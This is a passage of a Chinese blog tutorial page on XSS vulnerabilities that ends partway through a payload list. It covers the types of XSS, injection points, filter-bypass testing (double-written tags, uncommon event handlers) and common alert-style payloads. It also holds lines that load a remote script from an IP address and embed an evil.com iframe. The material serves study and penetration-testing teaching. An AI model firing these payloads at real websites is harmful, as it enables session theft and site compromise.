@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>XSS漏洞 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="由于时间和篇幅，只做浅析，往后时间充裕了再细细研究 简介 XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆" /><meta name="keywords" content='XSS, 渗透测试, Web安全' /><meta itemprop="name" content="XSS漏洞">
+<meta itemprop="description" content="由于时间和篇幅，只做浅析，往后时间充裕了再细细研究 简介 XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆"><meta itemprop="datePublished" content="2022-01-18T16:20:37+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="1375"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="XSS,渗透测试,Web安全," /><meta property="og:title" content="XSS漏洞" />
+<meta property="og:description" content="由于时间和篇幅，只做浅析，往后时间充裕了再细细研究 简介 XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/xss%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-18T16:20:37+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="XSS漏洞"/>
+<meta name="twitter:description" content="由于时间和篇幅，只做浅析，往后时间充裕了再细细研究 简介 XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/xss%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://geoer.cn/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="https://geoer.cn/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "XSS漏洞",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/xss%E6%BC%8F%E6%B4%9E\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "XSS, 渗透测试, Web安全","wordcount":  1375 ,
+    "url": "https:\/\/geoer.cn\/xss%E6%BC%8F%E6%B4%9E\/","datePublished": "2022-01-18T16:20:37+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>XSS漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2022-01-18&#32;16:20:37><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-18">2022-01-18</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1375 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 3 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="XSS漏洞">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#简介">简介</a></li>
+    <li><a href="#分类">分类</a>
+      <ul>
+        <li><a href="#1反射型xss">1.反射型xss</a></li>
+        <li><a href="#2存储型xss">2.存储型XSS</a></li>
+        <li><a href="#3dom型xss">3.DOM型XSS</a></li>
+      </ul>
+    </li>
+    <li><a href="#挖掘">挖掘</a>
+      <ul>
+        <li><a href="#测试思路">测试思路</a></li>
+        <li><a href="#常用payload">常用Payload</a></li>
+        <li><a href="#常见编码">常见编码</a></li>
+        <li><a href="#常见bypass">常见bypass</a>
+          <ul>
+            <li><a href="#过滤的绕过">过滤的绕过</a></li>
+            <li><a href="#过狗">过狗</a></li>
+          </ul>
+        </li>
+        <li><a href="#练习平台">练习平台</a></li>
+        <li><a href="#工具">工具</a></li>
+      </ul>
+    </li>
+    <li><a href="#java代码审计">Java代码审计</a>
+      <ul>
+        <li><a href="#xss常见触发位置">XSS常见触发位置</a></li>
+        <li><a href="#对于反射型xss">对于反射型XSS</a></li>
+        <li><a href="#对于存储型xss">对于存储型XSS</a></li>
+        <li><a href="#对于dom型xss">对于Dom型XSS</a></li>
+        <li><a href="#关键字">关键字</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞防御">漏洞防御</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><blockquote>
+<p>由于时间和篇幅，只做浅析，往后时间充裕了再细细研究</p>
+</blockquote>
+<h2 id="简介">简介</h2>
+<p>XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆，故命名为xss。黑客将恶意代码嵌入网页中，当客户网文网页的时候，网页中的脚本会自动执行，从而达成黑客攻击的目的。</p>
+<h2 id="分类">分类</h2>
+<h3 id="1反射型xss">1.反射型xss</h3>
+<p>非持久化，一般需要欺骗客户去点击构造好的链接才能触发代码。</p>
+<h3 id="2存储型xss">2.存储型XSS</h3>
+<p>他会存储到数据库中，这种xss漏洞危害极大，因为它可以长久的保存在网页中，每个浏览过此网页的用户都会中招，很多xss蠕虫的爆发都是基于持久型xss，一般在留言板，评论区类位置容易出现此漏洞。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/img/image-20220118223432836.png"
+    data-srcset="http://image.xpshuai.cn/img/image-20220118223432836.png, http://image.xpshuai.cn/img/image-20220118223432836.png 1.5x, http://image.xpshuai.cn/img/image-20220118223432836.png 2x"
+    data-sizes="auto"
+    alt="存储型XSS攻击流程"
+    title="存储型XSS攻击流程"/></p>
+<h3 id="3dom型xss">3.DOM型XSS</h3>
+<p>全称Document Object Model，使用DOM可以使程序和脚本能够动态访问更新文档的内容，结构及样式。
+DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。</p>
+<h2 id="挖掘">挖掘</h2>
+<p><strong>XSS可以插在哪里？</strong></p>
+<p>用户输入作为script标签内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//&lt;script&gt;标签：script是最有直接的xss攻击载荷，脚本标记可以应用外部的js代码，或者将脚本插入网页之中。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="o">(</span><span class="s">&#34;hhh&#34;</span><span class="o">)&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s">&#34;http://1.1.1.1/a.js&#34;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用户输入作为HTML注释内容</p>
+<p>用户输入作为HTML标签的属性名</p>
+<p>用户输入作为HTML标签的属性值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">//&lt;img &gt;标签：
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;2&#34;</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;hhh&#39;</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;2&#34;</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/hhh/</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;javascript:alert(&#34;</span><span class="nx">XSS</span><span class="s2">&#34;);&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">dynsrc</span><span class="o">=</span><span class="s2">&#34;javascript:alert(&#39;XSS&#39;)&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">lowsrc</span><span class="o">=</span><span class="s2">&#34;javascript:alert(&#39;XSS&#39;)&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">　　</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1">//&lt;table&gt;标签：
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">table</span> <span class="nx">background</span><span class="o">=</span><span class="s2">&#34;javascript::alert(&#39;hhh&#39;)&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1">//&lt;iframe&gt;标签：&lt;iframe&gt;标签允许另一个HTML网页的嵌入到父页面。IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="err">”</span><span class="nx">http</span><span class="o">:</span><span class="c1">//evil.com/xss.html”&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>用户输入作为HTML标签的名字</p>
+<p>直接插入到CSS里　</p>
+<h3 id="测试思路">测试思路</h3>
+<p>下面让我们来看一下XSS绕过的测试流程。</p>
+<p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p>
+<p>1.暴力测试（输入大量的payload，看返回结果）
+2.根据正则推算
+3.利用浏览器bug
+初步测试</p>
+<p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;、&lt;b&gt;、&lt;i&gt;、&lt;u&gt;</code>等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p>
+<p>（2）尝试插入不闭合的标签，例如：&lt;a、&lt;b、i&gt;、u&gt;、&lt;img等，然后看一下返回响应，是否对开放的标签也有过滤。</p>
+<p>（3）然后测试几种常见的XSS向量：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;script&gt;confirm(1)&lt;/script&gt;......看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了alert、prompt、confirm等字符，再尝试大小写的组合：
+</span></span><span class="line"><span class="cl">&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（4）如果过滤器仅仅是把<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签过滤掉，那么可以用双写的方式来绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;scr&lt;script&gt;ipt&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/scr&lt;script&gt;ipt&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样当<script>标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p>
+<p>（5）用&lt;ahref标签来测试，看返回响应</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;<span class="nv">ahref</span><span class="o">=</span><span class="s2">&#34;http://www.baidu.com&#34;</span>&gt;click&lt;/a&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看看&lt;a标签是否被过滤，href是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;<span class="nv">ahref</span><span class="o">=</span><span class="s2">&#34;javascript:alert(1)&#34;</span>&gt;click&lt;/a&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p>
+<p>继续测试事件触发执行javascript：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;<span class="nv">ahref</span><span class="o">=</span><span class="nv">xonmouseover</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;ClickHere&lt;/a&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看onmouseover事件是否被过滤。</p>
+<p>测试一个无效的事件，看看他的过滤规则：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;<span class="nv">ahref</span><span class="o">=</span><span class="nv">xonclimbatree</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;ClickHere&lt;/a&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;<span class="nv">bodyonhashchange</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;&lt;<span class="nv">ahref</span><span class="o">=</span><span class="c1">#&gt;click&lt;/a&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>onhashchange事件在当前URL的锚部分(以&rsquo;#&lsquo;号为开始)发生改变时触发。</p>
+<h3 id="常用payload">常用Payload</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Basic payload</span>
+</span></span><span class="line"><span class="cl">&lt;script&gt;alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span>&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;scr&lt;script&gt;ipt&gt;alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span>&lt;/scr&lt;script&gt;ipt&gt;
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>&gt;&lt;script&gt;alert<span class="o">(</span>String.fromCharCode<span class="o">(</span>88,83,83<span class="o">))</span>&lt;/script&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Img payload</span>
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span><span class="p">;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span>//
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span>String.fromCharCode<span class="o">(</span>88,83,83<span class="o">))</span><span class="p">;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">oneonerrorrror</span><span class="o">=</span>alert<span class="o">(</span>String.fromCharCode<span class="o">(</span>88,83,83<span class="o">))</span><span class="p">;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">src</span><span class="o">=</span>x:alert<span class="o">(</span>alt<span class="o">)</span> <span class="nv">onerror</span><span class="o">=</span>eval<span class="o">(</span>src<span class="o">)</span> <span class="nv">alt</span><span class="o">=</span>xss&gt;
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>&gt;&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span>String.fromCharCode<span class="o">(</span>88,83,83<span class="o">))</span><span class="p">;</span>&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Svg payload</span>
